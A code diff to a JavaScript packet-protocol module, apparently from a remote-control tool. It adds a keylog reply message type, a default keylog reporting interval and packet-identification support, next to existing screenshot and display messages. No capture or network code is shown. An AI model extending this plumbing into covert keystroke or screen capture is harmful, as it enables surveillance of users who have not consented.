@@ -22,7 +22,8 @@ const _MessageType = {
   r_Display: 13,
   r_Hello: 14,
   r_List: 15,
-  r_Screenshot: 16
+  r_Screenshot: 16,
+  r_Keylog: 17
 }
 
 // const _MessageTypeReverse = {}
@@ -148,6 +149,11 @@ Packets.Control = class Control extends _Control {
 Packets.KeylogSetup = class KeylogSetup extends _Control {
   constructor () {
     super(...arguments)
+    if (!this.data || !("interval" in this.data)) {
+      this.data = {
+        interval: 5 * 1000
+      }
+    }
     this.messageType = _MessageType.KeylogSetup
   }
 }
@@ -199,6 +205,13 @@ Packets.r_Display = class r_Display extends _Data {
   constructor () {
     super(...arguments)
     this.messageType = _MessageType.r_Display
+  }
+}
+
+Packets.r_Keylog = class r_Keylog extends _Data {
+  constructor () {
+    super(...arguments)
+    this.messageType = _MessageType.r_Keylog
   }
 }
 
@@ -255,6 +268,8 @@ function _identifyPacket (rawPacket) {
           return Packets.r_Display
         case _MessageType.r_Screenshot:
           return Packets.r_Screenshot
+        case _MessageType.r_Keylog:
+          return Packets.r_Keylog
       }
       break
   }
